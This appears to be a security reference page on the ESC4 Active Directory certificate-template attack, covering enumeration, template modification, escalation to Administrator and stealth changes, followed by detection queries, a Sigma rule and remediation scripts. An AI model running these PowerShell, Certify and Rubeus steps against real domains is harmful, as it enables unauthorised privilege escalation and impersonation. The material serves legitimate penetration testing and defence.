# ESC4 - Vulnerable Certificate Template Access Control

## Attack Overview

ESC4 exploits **misconfigured ACLs** on certificate templates themselves. If a low-privileged user has **write permissions** (GenericAll, WriteDacl, WriteProperty, WriteOwner) on a certificate template object in Active Directory, they can modify the template to make it vulnerable, then exploit it.

This is a **two-phase attack**:
1. **Modify** a certificate template to introduce ESC1/ESC2/ESC3 vulnerabilities
2. **Exploit** the newly created vulnerability

---

## Prerequisites

- Domain user credentials
- Write access to a certificate template object (one of):
  - **GenericAll** - Full control
  - **GenericWrite** - Write all properties
  - **WriteDacl** - Modify permissions
  - **WriteOwner** - Take ownership
  - **WriteProperty** - Modify specific properties

---

## Vulnerability Conditions

```
✓ Certificate template object has weak ACLs
✓ Low-privileged user has write permissions on template
✓ Template is published to one or more CAs
✓ Ability to enroll in templates
```

### Dangerous Permissions on Templates

| Permission | Risk | Exploitation |
|------------|------|--------------|
| GenericAll | Critical | Full control - can modify any setting |
| WriteOwner | Critical | Take ownership, then grant GenericAll |
| WriteDacl | Critical | Grant self GenericAll permission |
| WriteProperty | High | Modify template properties to create ESC1 |
| GenericWrite | High | Write template configuration |

---

## Attack Chain

### Phase 1: Enumeration

#### Using Certify
```powershell
# Find templates with weak ACLs
.\Certify.exe find /vulnerable

# Example output
[*] Template Name: ModifiableTemplate
    Template Permissions:
      CORP\Domain Users: GenericAll  <--- VULNERABLE
    Vulnerabilities: ESC4 - Template has weak ACLs
```

#### Using Certipy
```bash
certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.10.10.10 -vulnerable -stdout | grep -A 20 "ESC4"
```

#### Manual PowerShell Enumeration
```powershell
# Check template ACLs
Import-Module ActiveDirectory

$ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$TemplatesPath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"

# Get current user's groups
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$UserGroups = $CurrentUser.Groups | ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]) }

Get-ADObject -SearchBase $TemplatesPath -Filter * -Properties nTSecurityDescriptor | ForEach-Object {
    $Template = $_
    $ACL = $Template.nTSecurityDescriptor.Access

    foreach ($ACE in $ACL) {
        # Check for dangerous permissions
        if ($ACE.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|WriteProperty|GenericWrite") {
            # Check if current user or their groups have this permission
            if ($UserGroups -contains $ACE.IdentityReference) {
                Write-Host "[!] ESC4 Found!" -ForegroundColor Red
                Write-Host "    Template: $($Template.Name)"
                Write-Host "    Permission: $($ACE.ActiveDirectoryRights)"
                Write-Host "    Principal: $($ACE.IdentityReference)"
            }
        }
    }
}
```

#### Using PowerView
```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Find modifiable templates
$ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$TemplatesPath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"

Get-DomainObjectAcl -SearchBase $TemplatesPath -ResolveGUIDs | Where-Object {
    ($_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl|WriteOwner") -and
    ($_.SecurityIdentifier -match $CurrentUserSID)
}
```

---

### Phase 2: Exploitation

#### Scenario 1: GenericAll Permission

**Step 1: Backup Current Template Configuration**
```powershell
# Export template before modification
$ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$TemplateDN = "CN=ModifiableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"
$Template = Get-ADObject -Identity $TemplateDN -Properties *

# Save configuration for later restore
$Template | Export-Clixml -Path ".\template-backup.xml"
```

**Step 2: Modify Template to Enable ESC1**
```powershell
# Enable ENROLLEE_SUPPLIES_SUBJECT flag
Set-ADObject -Identity $TemplateDN -Replace @{
    'msPKI-Certificate-Name-Flag' = 1  # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
}

# Ensure Client Authentication EKU is present
Set-ADObject -Identity $TemplateDN -Replace @{
    'msPKI-Certificate-Application-Policy' = '1.3.6.1.5.5.7.3.2'  # Client Auth
}

# Grant ourselves enrollment rights
$ACL = Get-Acl -Path "AD:$TemplateDN"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$EnrollRight = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    [System.Security.Principal.NTAccount]$CurrentUser,
    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
    [System.Security.AccessControl.AccessControlType]::Allow,
    [GUID]"0e10c968-78fb-11d2-90d4-00c04f79dc55"  # Certificate-Enrollment
)
$ACL.AddAccessRule($EnrollRight)
Set-Acl -Path "AD:$TemplateDN" -AclObject $ACL
```

**Using Certify (Easier Method):**
```powershell
# Certify can modify templates automatically
.\Certify.exe /template:ModifiableTemplate /configuration:"DC01.corp.local\corp-DC01-CA" /install

# This will:
# 1. Add ENROLLEE_SUPPLIES_SUBJECT flag
# 2. Add Client Authentication EKU
# 3. Grant you enrollment rights
```

**Step 3: Exploit Modified Template (ESC1)**
```powershell
# Now exploit as ESC1
.\Certify.exe request /ca:DC01.corp.local\corp-DC01-CA /template:ModifiableTemplate /altname:Administrator

# Authenticate
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:password /ptt
```

**Step 4: Restore Template (Cleanup)**
```powershell
# Restore original configuration
$OriginalConfig = Import-Clixml -Path ".\template-backup.xml"

Set-ADObject -Identity $TemplateDN -Replace @{
    'msPKI-Certificate-Name-Flag' = $OriginalConfig.'msPKI-Certificate-Name-Flag'
    'msPKI-Certificate-Application-Policy' = $OriginalConfig.'msPKI-Certificate-Application-Policy'
}

# Restore ACL
$OriginalACL = $OriginalConfig.nTSecurityDescriptor
Set-Acl -Path "AD:$TemplateDN" -AclObject $OriginalACL
```

---

#### Scenario 2: WriteOwner Permission

**Step 1: Take Ownership**
```powershell
$ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$TemplateDN = "CN=ModifiableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"

# Get current ACL
$ACL = Get-Acl -Path "AD:$TemplateDN"

# Set ourselves as owner
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().User
$ACL.SetOwner($CurrentUser)
Set-Acl -Path "AD:$TemplateDN" -AclObject $ACL
```

**Step 2: Grant GenericAll to Self**
```powershell
# Now that we own it, grant ourselves GenericAll
$ACL = Get-Acl -Path "AD:$TemplateDN"
$CurrentUserAccount = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

$FullControlACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    [System.Security.Principal.NTAccount]$CurrentUserAccount,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow
)
$ACL.AddAccessRule($FullControlACE)
Set-Acl -Path "AD:$TemplateDN" -AclObject $ACL
```

**Step 3: Proceed with Scenario 1 (GenericAll)**

---

#### Scenario 3: WriteDacl Permission

**Grant GenericAll to Self:**
```powershell
$ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$TemplateDN = "CN=ModifiableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"

# Modify DACL to grant ourselves GenericAll
$ACL = Get-Acl -Path "AD:$TemplateDN"
$CurrentUserAccount = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

$GenericAllACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    [System.Security.Principal.NTAccount]$CurrentUserAccount,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow
)
$ACL.AddAccessRule($GenericAllACE)
Set-Acl -Path "AD:$TemplateDN" -AclObject $ACL

# Proceed with Scenario 1
```

---

#### Scenario 4: WriteProperty Permission

**Modify Specific Properties:**
```powershell
# Modify critical properties only
$ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$TemplateDN = "CN=ModifiableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"

# Enable ENROLLEE_SUPPLIES_SUBJECT
Set-ADObject -Identity $TemplateDN -Replace @{
    'msPKI-Certificate-Name-Flag' = 1
}

# Add Client Authentication EKU if not present
$Template = Get-ADObject -Identity $TemplateDN -Properties 'msPKI-Certificate-Application-Policy'
$CurrentEKUs = $Template.'msPKI-Certificate-Application-Policy'

if ($CurrentEKUs -notcontains "1.3.6.1.5.5.7.3.2") {
    $NewEKUs = $CurrentEKUs + "1.3.6.1.5.5.7.3.2"
    Set-ADObject -Identity $TemplateDN -Replace @{
        'msPKI-Certificate-Application-Policy' = $NewEKUs
    }
}

# Reduce required signatures to 0 if needed
Set-ADObject -Identity $TemplateDN -Replace @{
    'msPKI-RA-Signature' = 0
}

# Disable manager approval
Set-ADObject -Identity $TemplateDN -Replace @{
    'msPKI-Enrollment-Flag' = 0  # Remove approval requirement
}
```

---

### Phase 3: Advanced Techniques

#### Modify Multiple Templates

```powershell
# Script to modify all accessible templates
$ModifiableTemplates = @()

# Find all templates with write access
Get-ADObject -SearchBase $TemplatesPath -Filter * | ForEach-Object {
    $Template = $_
    $ACL = (Get-Acl -Path "AD:$($Template.DistinguishedName)").Access

    foreach ($ACE in $ACL) {
        if (($ACE.ActiveDirectoryRights -match "GenericAll|WriteProperty") -and
            ($ACE.IdentityReference -eq $CurrentUserAccount)) {
            $ModifiableTemplates += $Template
        }
    }
}

# Modify each template
foreach ($Template in $ModifiableTemplates) {
    Write-Host "[*] Modifying: $($Template.Name)"
    # Apply ESC1 modifications
    Set-ADObject -Identity $Template.DistinguishedName -Replace @{
        'msPKI-Certificate-Name-Flag' = 1
    }
}
```

#### Stealth Modifications

```powershell
# Make subtle changes less likely to be noticed

# Instead of ENROLLEE_SUPPLIES_SUBJECT, use other flags
# Set extended validity period for persistence
Set-ADObject -Identity $TemplateDN -Replace @{
    'pKIExpirationPeriod' = ([byte[]](0x00,0x40,0x1E,0x00,0x00,0x00,0x00,0x00))  # ~10 years
}

# Or modify less-monitored properties
# Change issuance policies, EKUs, etc.
```

---

## Detection

### Event Logs to Monitor

**Security Event 5136** - Directory Service Object Modified
```xml
EventID: 5136
Object Type: Certificate-Template
Look for:
  - msPKI-Certificate-Name-Flag modifications
  - msPKI-Certificate-Application-Policy changes
  - nTSecurityDescriptor modifications
  - Modifier: Non-administrative accounts
```

**Security Event 5137** - Directory Service Object Created
```xml
EventID: 5137
Object Type: Certificate-Template
Look for: New template creation by non-admins
```

**Security Event 5141** - Directory Service Object Deleted
```xml
EventID: 5141
Object Type: Certificate-Template
Look for: Template deletion by non-admins
```

### Detection Queries

#### Splunk - Certificate Template Modifications
```spl
index=windows EventCode=5136
| where ObjectClass="pKICertificateTemplate"
| rex field=Message "Attribute:\s+(?<Attribute>[^\n]+)"
| rex field=Message "Modifier:\s+(?<Modifier>[^\n]+)"
| where Attribute="msPKI-Certificate-Name-Flag" OR Attribute="msPKI-Certificate-Application-Policy" OR Attribute="nTSecurityDescriptor"
| table _time, Modifier, ObjectDN, Attribute, NewValue
```

#### KQL - Template ACL Modifications
```kql
SecurityEvent
| where EventID == 5136
| where ObjectType == "pKICertificateTemplate"
| extend Modifier = extract("Modifier:\\s+([^\\n]+)", 1, EventData)
| extend Attribute = extract("Attribute:\\s+([^\\n]+)", 1, EventData)
| where Attribute in ("msPKI-Certificate-Name-Flag", "nTSecurityDescriptor", "msPKI-Certificate-Application-Policy")
| where Modifier !contains "Administrator" and Modifier !contains "CA-ADMIN"
| project TimeGenerated, Modifier, ObjectDN, Attribute, NewValue
```

### Sigma Rule
```yaml
title: ESC4 Certificate Template Modification
description: Detects modifications to certificate template objects by non-admins
status: stable
logsource:
  product: windows
  service: security
detection:
  selection_event:
    EventID: 5136
  selection_object:
    ObjectClass: 'pKICertificateTemplate'
  selection_attribute:
    AttributeLDAPDisplayName:
      - 'msPKI-Certificate-Name-Flag'
      - 'msPKI-Certificate-Application-Policy'
      - 'nTSecurityDescriptor'
      - 'msPKI-Enrollment-Flag'
  filter_admins:
    SubjectUserName|contains:
      - 'Administrator'
      - 'CA-Admin'
      - 'PKI-Admin'
  condition: selection_event and selection_object and selection_attribute and not filter_admins
level: high
tags:
  - attack.privilege_escalation
  - attack.credential_access
```

---

## Remediation

### Immediate Actions

1. **Identify Modified Templates**
```powershell
# Check for recent template modifications
Get-EventLog -LogName Security -InstanceId 5136 -Newest 1000 | Where-Object {
    $_.Message -match "pKICertificateTemplate"
} | Select-Object TimeGenerated, Message | Format-List
```

2. **Restore Template Configurations**
```powershell
# If you have backups
Import-Clixml -Path ".\template-backup.xml" | ForEach-Object {
    Set-ADObject -Identity $_.DistinguishedName -Replace @{
        'msPKI-Certificate-Name-Flag' = $_.'msPKI-Certificate-Name-Flag'
        'msPKI-Certificate-Application-Policy' = $_.'msPKI-Certificate-Application-Policy'
    }
}
```

3. **Revoke Certificates from Modified Templates**
```powershell
# Revoke all certificates issued from modified templates during compromise window
certutil -view -restrict "CertificateTemplate=ModifiedTemplate,NotBefore>MM/DD/YYYY" -out "SerialNumber"

# Revoke each
certutil -revoke <SerialNumber> 1
```

---

### Long-Term Hardening

#### Fix Template ACLs

**Automated ACL Audit and Fix:**
```powershell
# Script: Fix-TemplateACLs.ps1

$ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$TemplatesPath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"

Get-ADObject -SearchBase $TemplatesPath -Filter * | ForEach-Object {
    $Template = $_
    $ACL = Get-Acl -Path "AD:$($Template.DistinguishedName)"

    # Remove dangerous permissions for non-admin groups
    $ACL.Access | Where-Object {
        ($_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl|WriteOwner") -and
        ($_.IdentityReference -notmatch "Enterprise Admins|Domain Admins|PKI Admins")
    } | ForEach-Object {
        Write-Host "[*] Removing dangerous ACE from $($Template.Name): $($_.IdentityReference)"
        $ACL.RemoveAccessRule($_)
    }

    Set-Acl -Path "AD:$($Template.DistinguishedName)" -AclObject $ACL
}
```

#### Recommended Template ACLs

```yaml
Certificate Template ACL Best Practice:

Read Permissions:
  - Authenticated Users (Read)
  - Domain Computers (Read)

Enroll Permissions:
  - Specific groups only (e.g., "Domain Computers" for computer certs)
  - NEVER: Domain Users, Authenticated Users (except for specific use cases)

Write Permissions:
  - Enterprise Admins (Full Control)
  - PKI Admins (Full Control)
  - NEVER: Regular users or groups

Auto-Enrollment:
  - Specific groups only
  - Minimal permissions
```

---

## Prevention Best Practices

### Template Management Framework

1. **Restrict Template Modification**
```powershell
# Only PKI admins should have write access
# Regular audit of template ACLs
```

2. **Implement Change Control**
```
- All template changes require approval
- Document modifications
- Version control for template configurations
- Automated backup before changes
```

3. **Enable Auditing**
```powershell
# Enable auditing on all certificate templates
$ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$TemplatesPath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"

Get-ADObject -SearchBase $TemplatesPath -Filter * | ForEach-Object {
    $ACL = Get-Acl -Path "AD:$($_.DistinguishedName)"
    $AuditRule = New-Object System.DirectoryServices.ActiveDirectoryAuditRule(
        [System.Security.Principal.SecurityIdentifier]"S-1-1-0",  # Everyone
        [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
        [System.Security.AccessControl.AuditFlags]::Success
    )
    $ACL.AddAuditRule($AuditRule)
    Set-Acl -Path "AD:$($_.DistinguishedName)" -AclObject $ACL
}
```

### Security Checklist

- [ ] Template ACLs restricted to PKI admins only
- [ ] Regular ACL audits automated
- [ ] Directory object modification auditing enabled (Event 5136)
- [ ] Alerts configured for template modifications
- [ ] Baseline template configurations documented
- [ ] Automated compliance checking
- [ ] Change management process for template modifications

---

## References

- [SpecterOps - Certified Pre-Owned (ESC4)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certify - Template Modification](https://github.com/GhostPack/Certify)
- [Microsoft - Certificate Template Security](https://docs.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-security)

---

**Author**: ADCS Attack Research
**Last Updated**: November 2025
**Classification**: Authorized Security Testing Only
